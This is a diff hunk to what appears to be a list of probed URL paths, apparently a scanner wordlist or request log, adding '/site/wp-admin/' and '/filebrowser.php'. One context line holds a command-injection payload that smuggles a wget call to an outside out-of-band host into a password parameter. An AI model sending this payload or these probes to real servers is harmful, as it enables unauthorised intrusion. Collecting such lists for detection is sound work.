@@ -23889,3 +23889,5 @@ ipv4-internet.yandex.net:443
 /Collector/nms/addModifyZTDProxy?ztd_server=127.0.0.1&ztd_port=3333&ztd_username=user&ztd_password=$(/bin/wget$IFShttp://d0m448i93sf15f65rb5gj3pxon9eh3drn.oast.live)
 /wp-json/sure-triggers/v1/connection/create-wp-connection
 /figs-loso-gold-figs-30-50-cm?order=ASC&page=23&sort=p.price&tag=-
+/site/wp-admin/
+/filebrowser.php
